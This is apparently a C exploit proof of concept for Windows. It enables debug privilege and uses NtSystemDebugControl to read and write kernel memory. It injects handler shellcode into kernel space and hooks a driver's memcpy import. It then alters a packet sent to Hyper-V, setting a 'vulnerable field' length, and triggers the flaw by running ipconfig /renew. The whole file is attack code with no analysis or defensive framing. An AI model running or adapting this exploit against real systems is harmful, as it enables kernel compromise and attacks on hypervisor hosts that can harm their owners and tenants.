#include <windows.h>
#include <winnt.h>
#include <stdio.h>

typedef enum _SYSDBG_COMMAND {
    SysDbgQueryModuleInformation,
    SysDbgQueryTraceInformation,
    SysDbgSetTracepoint,
    SysDbgSetSpecialCall,
    SysDbgClearSpecialCalls,
    SysDbgQuerySpecialCalls,
    SysDbgBreakPoint,
    SysDbgQueryVersion,
    SysDbgReadVirtual,
    SysDbgWriteVirtual,
    SysDbgReadPhysical,
    SysDbgWritePhysical,
    SysDbgReadControlSpace,
    SysDbgWriteControlSpace,
    SysDbgReadIoSpace,
    SysDbgWriteIoSpace,
    SysDbgReadMsr,
    SysDbgWriteMsr,
    SysDbgReadBusData,
    SysDbgWriteBusData,
    SysDbgCheckLowMemory,
    SysDbgEnableKernelDebugger,
    SysDbgDisableKernelDebugger,
    SysDbgGetAutoKdEnable,
    SysDbgSetAutoKdEnable,
    SysDbgGetPrintBufferSize,
    SysDbgSetPrintBufferSize,
    SysDbgGetKdUmExceptionEnable,
    SysDbgSetKdUmExceptionEnable,
    SysDbgGetTriageDump,
    SysDbgGetKdBlockEnable,
    SysDbgSetKdBlockEnable,
} SYSDBG_COMMAND, *PSYSDBG_COMMAND;

typedef struct _SYSDBG_VIRTUAL
{
  PVOID Address;
  PVOID Buffer;
  ULONG Request;
} SYSDBG_VIRTUAL, *PSYSDBG_VIRTUAL;

/****************************************************************************/

/* Prototypes */

LONG NTAPI ( *NtSystemDebugControl ) ( IN SYSDBG_COMMAND Command, IN PVOID InputBuffer  OPTIONAL, IN ULONG InputBufferLength, OUT PVOID OutputBuffer  OPTIONAL, IN ULONG OutputBufferLength, OUT PULONG ReturnLength  OPTIONAL );
int EscalatePrivileges ( void );
int ReadKernelMemory ( void * , void * , unsigned int );
int WriteKernelMemory ( void * , void * , unsigned int );

__declspec ( naked ) void handler ( void );
__declspec ( naked ) void handler2 ( void );
void packet_changer ( char * );

/****************************************************************************/

/* Program */

int main ( void )
{
  unsigned int original_address;
  unsigned int memcpy_address;
  unsigned int return_address;
  unsigned int jmp_address;
  unsigned int code_address = 0;
  unsigned int pos;
  char buffer [ 0x1000 ];
  char cmd [ 4096 ];
  char shellcode [ 256 ];
  char *pattern;
  int ret;

  pattern = "\xe8\xc7\x6f\xff\xff"; /* Pattern of the code to search  */
  EscalatePrivileges ();
  printf( "finding shellcode...\n" );

  for( pos=0x80000000; pos<0xfffff000; pos=pos+0x1000 )
  {
    ret = ReadKernelMemory( (void*) (pos+0x0ea), (void*) buffer, 5 ); /* Read the complete block */
    if ( ret == TRUE )
    {
      if ( memcmp(buffer, pattern, 5) == 0 )
      {
        /* If match */
        code_address = pos + 0x0ea;
        printf( "Patching code at %x\n" , code_address );
        break;
      }
    }
  }

  /* If the shellcode was found... */
  if ( code_address != 0 )
  {
    /* Get the memcpy() address */
    memcpy_address = code_address + 0xffff6fc7 + 5;
    printf( "memcpy = %x\n" , memcpy_address );

    /* Get the JMP which jumps to the memcpy() function imported from ntoskrnl.exe */
    ReadKernelMemory( (void*) ( memcpy_address + 2 ), (void*) &jmp_address, 4 );
    printf( "jmp_address = %x\n" , jmp_address );

    /* Make a copy of mi own shellcode */
    memcpy(shellcode, handler, 0x100 );

    /* Write the handler in kernel memory */
    ret = WriteKernelMemory( (void*) 0x8003fc00, shellcode, 0x100 );
    printf( "write: %i\n" , ret );

    /* Get the original pointer from the import's table */
    ReadKernelMemory( (void*) jmp_address, &original_address, 4 );
    printf( "original_address = %x\n" , original_address );

    /* Copy the memcpy() return address */
    return_address = code_address + 5;
    ret = WriteKernelMemory( (void*) 0x8003fff8, &return_address, 4 );
    printf ( "write: %i\n" , ret );

    /* Copy the original pointer from the driver import table */
    ret = WriteKernelMemory ( ( void * ) 0x8003fffc , &original_address , 4 );
    printf ( "write: %i\n" , ret );

    /* Patch the import table in order to jump to my shellcode */
    ret = WriteKernelMemory( (void*) jmp_address, "\x00\xfc\x03\x80", 4 );
    printf( "write: %i\n", ret );

    /* Just wait before trigger the bug */
    printf( "delaying 3 seconds...\n" );
    Sleep( 3000 );

    /* Get the system address and execute the command "ipconfig" for triggering the bug */
    GetSystemDirectory( cmd, 4096 );
    strncat( cmd, "\\ipconfig.exe /renew", 4096 );
    system ( cmd );
  }
  return ( 1 );
}

/****************************************************************************/

__declspec ( naked ) void handler ( void )
{
  /* Get the return address */
  asm mov eax,[esp]

  /* If the return address is NOT the same that I'm waiting for... */
  asm pushad
  asm mov ebx,0x8003fff8
  asm cmp eax,[ebx]
  asm jne no_change

  /* Modify the return address to return to my code after complete the call */
  asm popad
  asm mov eax,0x8003fc00+0x30
  asm mov [esp],eax
  asm jmp exit

asm no_change:
  asm popad

asm exit:

  /* Just continue the execution */
  __emit__ ( 0xff , 0x25 , 0xfc , 0xff , 0x03 , 0x80 ); // jmp [0x8003fffc ]

  /* Padding */
  __emit__ ( 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 );
  __emit__ ( 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 );
  __emit__ ( 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 );
  __emit__ ( 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 );
  __emit__ ( 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 );
}

/****************************************************************************/

__declspec ( naked ) void handler2 ( void )
{
  /* Execute the code that changes the packet sent to a Hyper-V */
  asm pushad
  asm push eax
  asm call packet_changer
  asm add esp,4
  asm popad

  /* Continue normal execution */
  __emit__ ( 0xff , 0x25 , 0xf8 , 0xff , 0x03 , 0x80 ); // jmp [0x8003fff8 ]
}

/****************************************************************************/

void packet_changer ( char *packet )
{
  /* Point to the packet head */
  packet = packet - 0x10;

  /* Set the packet as GpaDirect */
  packet [ 0x00 ] = 0x09;
  packet [ 0x01 ] = 0x00;
  packet [ 0x02 ] = 0x05;
  packet [ 0x03 ] = 0x00;
  packet [ 0x04 ] = 0x06;
  packet [ 0x05 ] = 0x00;
  packet [ 0x06 ] = 0x00;
  packet [ 0x07 ] = 0x00;
  packet [ 0x14 ] = 0x01;
  packet [ 0x15 ] = 0x00;
  packet [ 0x16 ] = 0x00;
  packet [ 0x17 ] = 0x00;
  packet [ 0x18 ] = 0x01;
  packet [ 0x19 ] = 0x00;
  packet [ 0x1a ] = 0x00;
  packet [ 0x1b ] = 0x00;
  packet [ 0x1c ] = 0x00;
  packet [ 0x1d ] = 0x00;
  packet [ 0x1e ] = 0x00;
  packet [ 0x1f ] = 0x00;

  /* vulnerable field  ( LEN of something ) */
  packet [ 0x20 ] = 0x33;
  packet [ 0x21 ] = 0x33;
  packet [ 0x22 ] = 0x33;
  packet [ 0x23 ] = 0x33;
  packet [ 0x24 ] = 0x33;
  packet [ 0x25 ] = 0x33;
  packet [ 0x26 ] = 0x33;
  packet [ 0x27 ] = 0x33;
}

/****************************************************************************/
/****************************************************************************/

int EscalatePrivileges ( void )
{
  TOKEN_PRIVILEGES new_token_privileges;
  unsigned int token_handle;
  int ret;

  /* Ask for permission like a debugger  */
  new_token_privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
  LookupPrivilegeValueA ( NULL, SE_DEBUG_NAME, &new_token_privileges.Privileges[0].Luid );

  /* Open token */
  //OpenProcessToken ( GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, (void*) &token_handle );
  OpenProcessToken ( GetCurrentProcess(), TOKEN_ALL_ACCESS, (void*) &token_handle );

  /* New privilege values */
  new_token_privileges.PrivilegeCount = 1;
  new_token_privileges.Privileges [ 0 ].Attributes = SE_PRIVILEGE_ENABLED;

  /* Set privileges */
  ret = AdjustTokenPrivileges( (void*) token_handle, FALSE, &new_token_privileges, sizeof(new_token_privileges), NULL, NULL );

  return ( ret );
}

/****************************************************************************/

int ReadKernelMemory ( void *address, void *buffer, unsigned int len )
{
  static int first_time = TRUE;
  SYSDBG_VIRTUAL DbgMemory;
  LONG Status;
  int ret = FALSE;

  /* If it is the first time  */
  if ( first_time == TRUE )
  {
    /* Resolve the function symbol */
    NtSystemDebugControl = GetProcAddress( GetModuleHandle("ntdll.dll"), "NtSystemDebugControl" );
    if ( NtSystemDebugControl == NULL )
    {
      puts( "Unable to resolve" );
      return ( ret );
    }
    first_time = FALSE;
  }

  /* Setup the request */
  DbgMemory.Address = address;
  DbgMemory.Buffer  = buffer;
  DbgMemory.Request = len;

  /* Do the read */
  Status = NtSystemDebugControl( SysDbgReadVirtual, &DbgMemory, sizeof(DbgMemory), NULL, 0, NULL );
  if ( Status >= 0 )
  {
    ret = TRUE;
  }
  return ( ret );
}

/****************************************************************************/

int WriteKernelMemory ( void *address , void *buffer , unsigned int len )
{
  static int first_time = TRUE;
  SYSDBG_VIRTUAL DbgMemory;
  LONG Status;
  int ret = FALSE;

  if ( first_time == TRUE )
  {
   /* Resolve the function symbol  */
    NtSystemDebugControl = GetProcAddress( GetModuleHandle("ntdll.dll"), "NtSystemDebugControl" );
    if ( NtSystemDebugControl == NULL )
    {
      puts ( "Unable to resolve" );
      return ( ret );
    }
  }
  else
  {
    first_time = FALSE;
  }


  /* Setup the request */
  DbgMemory.Address = address;
  DbgMemory.Buffer  = buffer;
  DbgMemory.Request = len;

  /* Do the read */
  Status = NtSystemDebugControl ( SysDbgWriteVirtual , &DbgMemory , sizeof ( DbgMemory ) , NULL , 0 , NULL );
  if ( Status >= 0 )
  {
    ret = TRUE;
  }
  return ( ret );
}

/****************************************************************************/
/****************************************************************************/

